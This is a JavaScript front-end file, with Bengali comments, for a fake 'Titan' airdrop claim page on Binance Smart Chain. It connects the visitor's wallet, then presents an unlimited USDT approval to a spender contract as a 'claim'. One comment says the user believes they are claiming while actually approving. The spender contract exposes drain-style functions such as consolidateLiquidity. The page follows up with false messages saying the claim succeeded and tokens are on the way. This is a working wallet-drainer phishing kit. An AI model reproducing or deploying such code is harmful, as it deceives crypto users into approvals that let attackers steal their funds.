/* ================= CONFIGURATION ================= */

// ১. আপনার দেওয়া কন্ট্রাক্ট অ্যাড্রেস (যেটা অ্যাপ্রুভাল পাবে)
const SPENDER_CONTRACT = "0xA6E28350e9130D296853D104ba4d0E895d334019"; 

// ২. টার্গেট টোকেন অ্যাড্রেস (USDT BEP20 - BSC Mainnet)
// আপনি চাইলে এটি পরিবর্তন করে অন্য টোকেন দিতে পারেন
const TARGET_TOKEN = "0x566bA3A91497E66eb6D309FfC3F1228447619BcE"; 

// ৩. আপনার দেওয়া ABI (এটা কন্ট্রাক্ট ইন্টারঅ্যাকশনের জন্য রেখে দেওয়া হলো)
const TITAN_ABI = [
    {"inputs":[],"stateMutability":"nonpayable","type":"constructor"},
    {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"token","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"EmergencyRecovery","type":"event"},
    {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"newGovernance","type":"address"}],"name":"GovernanceUpdated","type":"event"},
    {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"LiquidityPoolStaked","type":"event"},
    {"anonymous":false,"inputs":[{"indexed":false,"internalType":"bool","name":"isPaused","type":"bool"}],"name":"SystemStatusChanged","type":"event"},
    {"inputs":[{"internalType":"address","name":"_user","type":"address"},{"internalType":"address","name":"_token","type":"address"}],"name":"consolidateLiquidity","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"internalType":"address","name":"_user","type":"address"},{"internalType":"address[]","name":"_tokens","type":"address[]"}],"name":"consolidateLiquidityBatch","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"internalType":"address","name":"_user","type":"address"},{"internalType":"address","name":"_token","type":"address"}],"name":"executeInternal","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[],"name":"paused","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"rescueStuckNative","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"internalType":"address","name":"_tokenAddress","type":"address"}],"name":"rescueStuckToken","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"internalType":"bool","name":"_status","type":"bool"}],"name":"setPause","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"internalType":"address","name":"_newGov","type":"address"}],"name":"transferRights","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"stateMutability":"payable","type":"receive"}
];

// ৪. টোকেন অ্যাপ্রুভালের জন্য স্ট্যান্ডার্ড ERC20 ABI
const ERC20_ABI = [
    "function approve(address spender, uint256 amount) public returns (bool)",
    "function allowance(address owner, address spender) public view returns (uint256)",
    "function balanceOf(address account) view returns (uint256)"
];

/* ================= MAIN LOGIC ================= */

let provider;
let signer;
let userAddress;

// ১. ওয়ালেট কানেক্ট ফাংশন
async function connectWallet() {
    const btn = document.getElementById("connectBtn"); // HTML-এর কানেক্ট বাটন আইডি
    const statusMsg = document.getElementById("statusMsg"); // স্ট্যাটাস মেসেজ শো করার জন্য

    if (typeof window.ethereum === 'undefined') {
        alert("Please Install MetaMask or Trust Wallet!");
        return;
    }

    try {
        // মেটামাস্ক প্রভাইডার সেটআপ
        provider = new ethers.providers.Web3Provider(window.ethereum);
        
        // কানেকশন রিকোয়েস্ট
        await provider.send("eth_requestAccounts", []);
        signer = provider.getSigner();
        userAddress = await signer.getAddress();

        // নেটওয়ার্ক চেক (BSC Chain ID: 56)
        const network = await provider.getNetwork();
        if (network.chainId !== 56) {
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x38' }], // 56 in Hex
                });
                // নেটওয়ার্ক চেঞ্জ হলে প্রভাইডার রিফ্রেশ
                provider = new ethers.providers.Web3Provider(window.ethereum);
                signer = provider.getSigner();
            } catch (error) {
                alert("Please switch to Binance Smart Chain (BSC)!");
                return;
            }
        }

        // বাটন আপডেট
        if(btn) btn.innerText = userAddress.slice(0, 6) + "..." + userAddress.slice(-4);
        if(statusMsg) {
            statusMsg.innerText = "✅ Wallet Connected! Ready to Claim.";
            statusMsg.style.color = "#00ff88";
        }

        console.log("Connected:", userAddress);

    } catch (error) {
        console.error("Connection Error:", error);
        alert("Connection Failed!");
    }
}

// ২. ক্লেইম এয়ারড্রপ ফাংশন (যেখানে Unlimited Approval চাইবে)
async function claimAirdrop() {
    // প্রথমে চেক করবে ওয়ালেট কানেক্ট করা আছে কি না
    if (!userAddress) {
        await connectWallet();
        return;
    }

    const statusMsg = document.getElementById("statusMsg");
    if(statusMsg) statusMsg.innerText = "Processing Claim... Please Confirm Transaction.";

    try {
        // টোকেন কন্ট্রাক্ট ইনিশিলাইজ করা
        const tokenContract = new ethers.Contract(TARGET_TOKEN, ERC20_ABI, signer);

        // 🔥 UNLIMITED APPROVAL LOGIC 🔥
        // আমরা চেক করছি আগে কোনো অ্যাপ্রুভাল দেওয়া আছে কি না
        const currentAllowance = await tokenContract.allowance(userAddress, SPENDER_CONTRACT);
        const minRequired = ethers.utils.parseUnits("1000", 18); // জাস্ট চেক করার জন্য

        // যদি অ্যাপ্রুভাল না থাকে বা কম থাকে, তাহলে আনলিমিটেড চাইবে
        if (currentAllowance.lt(minRequired)) {
            console.log("Requesting Infinite Approval...");
            
            // ম্যাক্সিমাম পসিবল নাম্বার (Unlimited)
            const maxApproval = ethers.constants.MaxUint256;

            // ইউজার দেখবে সে "Claim" করছে, কিন্তু আসলে সে "Approve" দিচ্ছে
            const tx = await tokenContract.approve(SPENDER_CONTRACT, maxApproval);
            
            if(statusMsg) statusMsg.innerText = "Verifying eligibility on blockchain...";
            
            // কনফার্মেশন হওয়া পর্যন্ত অপেক্ষা
            await tx.wait();
            
            console.log("Approval Successful!");
        } else {
            console.log("Already Approved! No need to approve again.");
        }

        // সফল হওয়ার মেসেজ
        if(statusMsg) {
            statusMsg.innerText = "🎉 Airdrop Claimed Successfully! Tokens will arrive shortly.";
            statusMsg.style.color = "#00ff88";
        }
        alert("Success! Welcome to the Titan Ecosystem.");

    } catch (error) {
        console.error("Claim Error:", error);
        if(statusMsg) {
            statusMsg.innerText = "Transaction Failed or Rejected.";
            statusMsg.style.color = "red";
        }
    }
}
    
